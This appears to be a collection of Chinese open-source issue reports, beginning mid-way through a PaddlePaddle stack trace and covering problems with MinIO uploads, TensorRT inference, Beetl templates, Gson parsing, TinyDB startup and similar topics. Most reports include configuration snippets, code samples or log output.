boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 332 7 0x7f37e7e94abep paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) + 382 8 0x7f37e7e958ffp paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;, bool) + 143 9 0x7f37e7d0f55ep 10 0x7f37e7d5292ep 11 0x7f38255fc599p PyEval_EvalFrameEx + 31177 12 0x7f38255fe3bdp PyEval_EvalCodeEx + 2061 13 0x7f38255fca92p PyEval_EvalFrameEx + 32450 14 0x7f38255fe3bdp PyEval_EvalCodeEx + 2061 15 0x7f38255fca92p PyEval_EvalFrameEx + 32450 16 0x7f38255fe3bdp PyEval_EvalCodeEx + 2061 17 0x7f38255fca92p PyEval_EvalFrameEx + 32450 18 0x7f38255fe3bdp PyEval_EvalCodeEx + 2061 19 0x7f38255fca92p PyEval_EvalFrameEx + 32450 20 0x7f38255fe3bdp PyEval_EvalCodeEx + 2061 21 0x7f38255fe4f2p PyEval_EvalCode + 50 22 0x7f3825629062p PyRun_FileExFlags + 146 23 0x7f382562a3e9p PyRun_SimpleFileExFlags + 217 24 0x7f38256403bfp Py_Main + 3199 25 0x7f3824f2cec5p __libc_start_main + 245 26 0x4006fep"
oss文件上传，调用OssTemplate 中的方法， minio上传会 删除在 console 创建的Buckets，导致上传失败,pig版本: 依赖版本： 是否修改包名: 否 配置： 描述： 我在 minio console 创建了名为test的 Buckets，调用OssTemplate中上传的方法之后，调用获取url链接方法，访问报错： 之后到minio console 发现 Buckets被删了。 期望作者排查下是否是兼容性问题。   <code>: &lt;dependency&gt; &lt;groupId&gt;com.pig4cloud.plugin&lt;/groupId&gt; &lt;artifactId&gt;oss-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.0.3&lt;/version&gt; &lt;/dependency&gt; oss: endpoint: http://127.0.0.1:9000 access-key: minioadmin secret-key: minioadmin bucket-name: test &lt;Error&gt; &lt;Code&gt;NoSuchBucket&lt;/Code&gt; &lt;Message&gt;The specified bucket does not exist&lt;/Message&gt; &lt;Key&gt;banner.txt&lt;/Key&gt; &lt;BucketName&gt;test&lt;/BucketName&gt; &lt;Resource&gt;/test/banner.txt&lt;/Resource&gt; &lt;RequestId&gt;16CABD1A6A0CD3C0&lt;/RequestId&gt; &lt;HostId&gt;0d441eba-d990-46be-9b2f-949d602fd9ad&lt;/HostId&gt; &lt;/Error&gt;
landmark 中 resnet152 使用 TensorRT 预测有 diff,环境 1）PaddlePaddle版本：1.4.1 2）CUDA 8.0 + cudnn v7 + TensorRT 3）系统环境：CentOs 6u3 4）c++ 预测 复现 模型：landmark retrieval model 第二部分 使用带 TensorRT 的预测和不带 TensorRT 的预测有 diff，跑第三部分没问题   <code>: python infer_retrieval.py test_retrieval res152_arcmargin
Move creators of decorated readers to main program,"In our design of parallel executor, each device will have its own decorated readers. To make sure all decorated readers are distributed to devices correctly, decorated reader creation ops must be in the as well as their output readers.   <code>: main_program"
图片上传 查看dialog不显示,"回显步骤。 1.tip 提示换行加入标签没有作用 2.点击编辑是图片正常显示,编辑上传没有问题,点击查看图片出显示空白 异常日志 注意使用MD语法 日志 使用 ``格式化日志，越多详细越好 配置JSON 如下 { label: ""上传图片"", prop: ""img"", type:'upload', imgWidth:80, imgHeight:80, listType:'picture-img', span: 24, hide: true, action: '/api/blade-resource/oss/endpoint/put-file', tip: , propsHttp: { res: 'data', url: 'link', }, rules: [{ required: true, message: ""请输入上传图片"", trigger: ""blur"" }] }, 异常截图和代码   <code>: 单张图片大小不得超过3M；仅支持jpg、jpeg、png格式尺寸为：宽 400 px 高300px，请严格按照尺寸设计，以保证上线效果"
Forest请求接口继承规则,"Forest请求接口继承父接口，并且父接口的注解在子接口类上也有效 直接继承父类方法和其所有注解 子接口类上的和方法上的注解覆盖父接口类上的和方法上的注解   <code>: // 父接口类上的和方法上的注解能都被子接口类继承 @Address(port = ""80"") public interface ParentClient { @Get(""/A"") String testA(); @Get(""/B"") String testB(); @Get(""/X"") String testC(); } public interface SubClient extends ParentClient { } subClient.testA(); // GET http://localhost:80/A subClient.testB(); // GET http://localhost:80/B subClient.testC(); // GET http://localhost:80/X @Address(host = ""192.168.0.2"", port = ""8080"") public interface SubClient extends ParentClient { // 遇到重写方法的情况，遵循子类注注解覆盖父类注解的原则 @Get(""/C"") String testC(); } subClient.testA(); // GET http://192.168.0.2:8080/A subClient.testB(); // GET http://192.168.0.2:8080/B subClient.testC(); // GET http://192.168.0.2:8080/C"
debug logs in release version,"Currently maple produce debug logs in release version. It leads to increasing binary size of compiler release version. I removed some lines which produce debug logging and binary size decreased by 2%. Current binary size -- 10975872 bytes Binary size with my changes -- 10733264 bytes I propose to implement macros like a ""DEBUG_STMT(x)"" and start to use ones to hide debug logs in release version. Refactoring of existing code is also required. These changes also should affect hir2mpl release version   <code>: DEBUG_STMT(LogInfo::MapleLogger() &lt;&lt; ""Debug info"" &lt;&lt; std::endl;)"
拼音分词的疑问,"jcseg 版本：2.4.0 elastic 版本6.4.3 在JcsegTaskConfig类中已将LOAD_CJK_PINYIN，APPEND_CJK_PINYIN两个常量改成true，分词结果中出现了拼音，但是缺少首字母： 理想状态是额外含有,，分词。 另外有一点想请教作者，检索分词时应该不需要进行拼音分词，因为索引分词中已经存在拼音了，检索时输入什么就搜什么对吧，这种情况下应该怎么设置屏蔽拼音分词呢？   <code>: {""text"":[""快点还钱""],""analyzer"":""jcseg_complex""} 结果： { ""tokens"": [ { ""token"": ""快点"", ""start_offset"": 0, ""end_offset"": 2, ""type"": ""word"", ""position"": 0 } , { ""token"": ""kuai dian"", ""start_offset"": 0, ""end_offset"": 9, ""type"": ""word"", ""position"": 1 } , { ""token"": ""还钱"", ""start_offset"": 2, ""end_offset"": 4, ""type"": ""word"", ""position"": 2 } , { ""token"": ""huan qian"", ""start_offset"": 2, ""end_offset"": 11, ""type"": ""word"", ""position"": 3 } ] } kd hq kdhq"
【众智】【计算-AICPU开发】SparseMatrixSparseCholesky,AICPU算子接入 CSRTensor(CSR格式稀疏矩阵)的Cholesky分解。 x_dense_shape x_batch_pointers x_row_pointers x_col_indices x_values permutation y_dense_shape y_batch_pointers y_row_pointers y_col_indices y_values 对应底层算子 对应底层AI CPU算子SparseMatrixSparseCholesky https://www.tensorflow.org/api_docs/python/tf/raw_ops/SparseMatrixSparseCholesky 3. 异常处理 4. 算子反向 无需实现反向   <code>: class SparseMatrixSparseCholesky(Primitive):
下载出现问题,You have no right to access this object because of bucket acl. 63429F2B07D4B93130A9A6B9 pdmaner-release.oss-cn-hangzhou.aliyuncs.com   <code>: AccessDenied
input-group的错误提示修改建议,"如果input-group-addon部分文字太多，导致宽度不是42，那么会出现以下情况，如下图： 本人css不是太熟，如果有别的解决办法可以忽略此issue   <code>: .input-group div { position: relative; } .input-group label.error { z-index:99; right: 3px; } &lt;div class=""input-group""&gt; &lt;div&gt;&lt;input id=""logoUrl"" name=""logoUrl"" class=""form-control"" placeholder=""请填写有效的图片地址"" type=""text"" required&gt;&lt;/div&gt; &lt;a onclick=""showImg()"" class=""input-group-addon""&gt;&lt;i class=""fa fa-search""&gt;&lt;/i&gt; 查看图片&lt;/a&gt; &lt;/div&gt;"
2.7.7子表单新增报错,"2.7.7子表单新增报错 变化的问题   <code>: ref=""main"""
连续的when标签，之间并不是完全并行的,"目前这种先并行执行b,d，再并行执行e,f,g，并不是完全并行的 必须要写成才可以   <code>: &lt;when value=""b,d""/&gt; &lt;when value=""e,f,g""/&gt;"
ssd检测头multi_box_head注释有误,"问题描述：SSD检测头multi_box_head注释部分出现问题，日志/代码关键片段： Examples: .. code-block:: python inputs最后一个参数conv5应部分应改为conv6   <code>: mbox_locs, mbox_confs, box, var = fluid.layers.multi_box_head( inputs=[conv1, conv2, conv3, conv4, conv5, conv5], image=images, num_classes=21, min_ratio=20, max_ratio=90, aspect_ratios=[[2.], [2., 3.], [2., 3.], [2., 3.], [2.], [2.]], base_size=300, offset=0.5, flip=True, clip=True)"
生成代码后，访问页面显示此错误，和系统页面代码对比后没发现什么错误，求解答,org.springframework.web.util.NestedServletException: Request processing failed; nested exception is 03:03:02:表达式值为空(NULL):p.items 位于64行 资源:/views/htmltags/form/select.html 61| ======================== 调用栈: /views/htmltags/form/select.html 行：64 /views/modules/clickads/clickadsList.html 行：21 Caused by: 03:03:02:表达式值为空(NULL):p.items 位于64行 资源:/views/htmltags/form/select.html 61| ======================== 调用栈: /views/htmltags/form/select.html 行：64 /views/modules/clickads/clickadsList.html 行：21 Caused by: NULL at org.beetl.core.statement.ForStatement.execute(ForStatement.java:83) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.statement.ContentBodyExpression.evaluate(ContentBodyExpression.java:55) at org.beetl.core.statement.VarAssignStatement.execute(VarAssignStatement.java:52) at org.beetl.core.statement.VarAssignStatementSeq.execute(VarAssignStatementSeq.java:53) at org.beetl.core.statement.Program.execute(Program.java:70) at org.beetl.core.engine.FilterProgram.execute(FilterProgram.java:31) at org.beetl.core.Template.renderTo(Template.java:136) at com.jeesite.common.beetl.ext.tag.HTMLTag.callHtmlTag(ne:16) at org.beetl.ext.tag.HTMLTagSupportWrapper.render(HTMLTagSupportWrapper.java:68) at com.jeesite.common.beetl.ext.tag.HTMLTag.render(ne:203) at org.beetl.core.statement.TagStatement.runTag(TagStatement.java:108) at org.beetl.core.statement.TagStatement.execute(TagStatement.java:87) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.Tag.doBodyRender(Tag.java:60) at org.beetl.core.Tag.getBodyContent(Tag.java:69) at com.jeesite.common.beetl.ext.tag.HTMLTag.callHtmlTag(ne:142) at org.beetl.ext.tag.HTMLTagSupportWrapper.render(HTMLTagSupportWrapper.java:68) at com.jeesite.common.beetl.ext.tag.HTMLTag.render(ne:203) at org.beetl.core.statement.TagStatement.runTag(TagStatement.java:108) at org.beetl.core.statement.TagStatement.execute(TagStatement.java:87) at org.beetl.core.statement.BlockStatement.execute(BlockStatement.java:68) at org.beetl.core.Tag.doBodyRender(Tag.java:60) at org.beetl.core.Tag.getBodyContent(Tag.java:69) at org.beetl.ext.tag.LayoutTag.render(LayoutTag.java:104) at org.beetl.core.statement.TagStatement.runTag(TagStatement.java:108) at org.beetl.core.statement.TagStatement.execute(TagStatement.java:87) at org.beetl.core.statement.Program.execute(Program.java:70) at org.beetl.core.engine.FilterProgram.execute(FilterProgram.java:31) at org.beetl.core.Template.renderTo(Template.java:136) ... 58 more   <code>: at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:982) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861) at javax.servlet.http.HttpServlet.service(HttpServlet.java:635) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846) at javax.servlet.http.HttpServlet.service(HttpServlet.java:742) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:123) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at com.jeesite.common.shiro.web.L.doFilterInternal(mk:56) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:197) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:504) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:803) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:790) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1459) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) at com.jeesite.common.beetl.handler.LoggerErrorHandler.processExcption(gf:145) at org.beetl.core.Template.renderTo(Template.java:169) at org.beetl.core.Template.renderTo(Template.java:89) at org.beetl.ext.web.WebRender.render(WebRender.java:125) at org.beetl.ext.spring.BeetlSpringView.renderMergedTemplateModel(BeetlSpringView.java:123) at com.jeesite.common.beetl.view.BeetlView.renderMergedTemplateModel(de:43) at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:167) at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303) at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1286) at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1041) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:984) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970) ... 47 more
文件工具类建议新增File与MultipartFile互转方法,"JDK版本： jdk1.8 hutool版本： 5.5.1 文件工具类建议新增File与MultipartFile互转方法 样例（供参考） //#region MultipartFile 转 File /** * MultipartFile 转 File * * @chancelai file * @throws Exception */ public static File multipartFileToFile(MultipartFile file) throws Exception {   <code>: File toFile = null; if ("""".equals(file) || file.getSize() &lt;= 0) { file = null; } else { InputStream ins = null; ins = file.getInputStream(); toFile = new File(file.getOriginalFilename()); inputStreamToFile(ins, toFile); ins.close(); } return toFile; } //获取流文件 private static void inputStreamToFile(InputStream ins, File file) { try { OutputStream os = new FileOutputStream(file); int bytesRead = 0; byte[] buffer = new byte[8192]; while ((bytesRead = ins.read(buffer, 0, 8192)) != -1) { os.write(buffer, 0, bytesRead); } os.close(); ins.close(); } catch (Exception e) { e.printStackTrace(); } } //#endregion //#region File 转 MultipartFile /** * File 转 MultipartFile * @param file * @return */ public static MultipartFile fileToMultipartFile(File file) { FileItem fileItem = createFileItem(file); MultipartFile multipartFile = new CommonsMultipartFile(fileItem); return multipartFile; } private static FileItem createFileItem(File file) { FileItemFactory factory = new DiskFileItemFactory(16, null); FileItem item = factory.createItem(""textField"", ""text/plain"", true, file.getName()); int bytesRead = 0; byte[] buffer = new byte[8192]; try { FileInputStream fis = new FileInputStream(file); OutputStream os = item.getOutputStream(); while ((bytesRead = fis.read(buffer, 0, 8192)) != -1) { os.write(buffer, 0, bytesRead); } os.close(); fis.close(); } catch (IOException e) { e.printStackTrace(); } return item; } //endregion"
tinydb.xml中schema配置错误，但是启动的时候没有报错，直接报web应用停止，而没有任何错误信息,"RT。 bizframe中xxx.beans.xml中tinydb.xml中schema属性配置为authority_management2。实际上这个schema不存在。应该报错，而日志中没有任何error信息。该web应用直接挂了。这样很难去排查错误原因。 日志：   <code>: 2015-06-03 17:30:44,930 -28322 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始扫描schema：authority_management 2015-06-03 17:30:44,966 -28358 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:incrementer信息 2015-06-03 17:30:44,987 -28379 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:incrementer信息完成 2015-06-03 17:30:44,987 -28379 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_dict信息 2015-06-03 17:30:44,990 -28382 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_dict信息完成 2015-06-03 17:30:44,990 -28382 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_dictitem信息 2015-06-03 17:30:44,992 -28384 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_dictitem信息完成 2015-06-03 17:30:44,992 -28384 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_function信息 2015-06-03 17:30:44,995 -28387 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_function信息完成 2015-06-03 17:30:44,995 -28387 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_operation_log信息 2015-06-03 17:30:44,998 -28390 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_operation_log信息完成 2015-06-03 17:30:44,998 -28390 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_organization信息 2015-06-03 17:30:45,000 -28392 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_organization信息完成 2015-06-03 17:30:45,000 -28392 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_role信息 2015-06-03 17:30:45,003 -28395 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_role信息完成 2015-06-03 17:30:45,003 -28395 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_role_t_function信息 2015-06-03 17:30:45,005 -28397 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_role_t_function信息完成 2015-06-03 17:30:45,005 -28397 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_sysparam信息 2015-06-03 17:30:45,008 -28400 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_sysparam信息完成 2015-06-03 17:30:45,008 -28400 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_user信息 2015-06-03 17:30:45,010 -28402 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_user信息完成 2015-06-03 17:30:45,010 -28402 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 开始获取表格:t_user_t_role信息 2015-06-03 17:30:45,016 -28408 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 获取表格:t_user_t_role信息完成 2015-06-03 17:30:45,017 -28409 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.tinydb.convert.impl.AbstractTableConfigLoad - 扫描schema结束：authority_management 2015-06-03 17:30:45,072 -28464 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.tinygroup.tinydb.spring.DBOperatorFactoryBean - 解析tinydb配置文件结束 2015-06-03 17:30:45,073 -28465 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Finished creating instance of bean 'tinyDBOperatorFactory' 2015-06-03 17:30:45,078 -28470 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Finished creating instance of bean 'beanOperatorManager' 2015-06-03 17:30:45,086 -28478 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Creating instance of bean 'beanStringOperator' 2015-06-03 17:30:45,127 -28519 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Returning cached instance of singleton bean 'jdbcTemplate' 2015-06-03 17:30:45,127 -28519 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Added autowiring by name from bean name 'beanStringOperator' via property 'jdbcTemplate' to bean named 'jdbcTemplate' 2015-06-03 17:30:45,127 -28519 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.springframework.beans.factory.support.DefaultListableBeanFactory - Finished creating instance of bean 'beanStringOperator' 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.weblayer.ApplicationStartupListener - WEB 应用停止中... 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bizframeimpl.security.EncryptionProcessor正在停止... 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bizframeimpl.security.EncryptionProcessor停止完毕。 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bizframeimpl.log.LogAdapterImpl正在停止... 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bizframeimpl.log.LogAdapterImpl停止完毕。 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.fileresolver.applicationprocessor.FileMonitorProcessor正在停止... 2015-06-03 17:30:45,137 -28529 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.fileresolver.applicationprocessor.FileMonitorProcessor停止完毕。 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.weblayer.listener.TinyListenerProcessor正在停止... 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.weblayer.listener.TinyListenerProcessor停止完毕。 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.serviceprocessor.ServiceApplicationProcessor正在停止... 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.tinygroup.serviceprocessor.ServiceEventProcessorImpl - 停止ServiceProcessor 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.cepcorenetty.NettyCepCoreImpl - 开始 注销EventProcessor:ServiceEventProcessorImpl 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.cepcorenetty.NettyCepCoreImpl - 注销EventProcessor:ServiceEventProcessorImpl完成 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] DEBUG org.tinygroup.serviceprocessor.ServiceEventProcessorImpl - 停止ServiceProcessor完成 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.serviceprocessor.ServiceApplicationProcessor停止完毕。 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.dict.applicationprocessor.DictLoadProcessor正在停止... 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.dict.applicationprocessor.DictLoadProcessor停止完毕。 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bundle.applicationprocessor.BundleApplicationProcessor正在停止... 2015-06-03 17:30:45,138 -28530 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.bundle.applicationprocessor.BundleApplicationProcessor停止完毕。 2015-06-03 17:30:45,139 -28531 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.fileresolver.applicationprocessor.FileResolverProcessor正在停止... 2015-06-03 17:30:45,139 -28531 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.application.impl.ApplicationDefault - 应用处理器class org.tinygroup.fileresolver.applicationprocessor.FileResolverProcessor停止完毕。 2015-06-03 17:30:45,139 -28531 [ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO org.tinygroup.weblayer.ApplicationStartupListener - WEB 应用停止完成。"
使用Gson遇到的问题,"找到原因了。不能用gson jar包。在AccessToken.java文件，如下代码 gson会将expires_in的值7200，转成7200.0，在 这一句就出错了。打印日志我也贴一下。 Gson问题记录   <code>: Map&lt;String, Object&gt; temp = JsonUtils.decode(jsonStr, Map.class); access_token = (String) temp.get(""access_token""); System.out.println(""access expires_in:""+temp.get(""expires_in"")); System.out.println(""access errcode:""+temp.get(""errcode"")); expires_in = (Integer) temp.get(""expires_in""); expires_in = (Integer) temp.get(""expires_in""); json:{""access_token"":""W1lqLK3ED-CSAAAqsj8L7R0LJeysKsudWO42CJvUuIEf5wW971XKviqc3_NSnNxgzqR-b2qzPnfk7C_C3jeUeXCBIIaYe_-h_60hlcQVcwcMSRdAIADJI"",""expires_in"":7200} access expires_in:7200.0"
网关跨域支持,在网关添加了一个配置，用于支持，这是一个可选的功能，如果开启了可以带来很多便利性，不需要时也可以关闭。<del>主要是有些小伙伴被这个问题折磨得欲仙欲死</del>   <code>: CORS
